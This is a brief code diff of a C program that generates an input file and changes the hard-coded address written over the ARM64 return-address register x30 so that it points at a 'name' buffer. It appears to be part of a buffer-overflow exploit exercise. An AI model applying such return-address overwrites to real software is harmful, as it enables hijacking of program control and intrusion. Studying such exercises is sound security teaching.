@@ -57,7 +57,7 @@ int main(void) {
     }
 
     /* write address of name[0] in x30 */
-    ulAddr = 0x420058;
+    ulAddr = 0x42006c;
     fwrite(&ulAddr, sizeof(unsigned long), 1, psFile);
 
     fclose(psFile);
